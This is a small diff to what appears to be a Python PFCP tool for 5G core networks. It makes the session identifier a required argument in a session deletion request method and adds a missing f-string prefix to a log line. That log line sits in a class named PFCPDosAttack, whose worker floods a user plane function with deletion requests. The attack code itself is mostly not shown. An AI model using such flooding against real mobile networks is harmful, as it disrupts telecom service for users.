@@ -250,8 +250,8 @@ class Ez_PFCP:
         if self.verbose:
             print(f"[EZ-PFCP] PFCP Session Establishment packet sent")
 
-    def Send_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
-        seid = seid or self.seid
+    def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
+        
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -474,7 +474,7 @@ class PFCPDosAttack:
 
     def pfcp_session_deletion_flood_worker(self, count, start_index=0):
         if self.verbose:
-            print("[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
+            print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
         
         
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
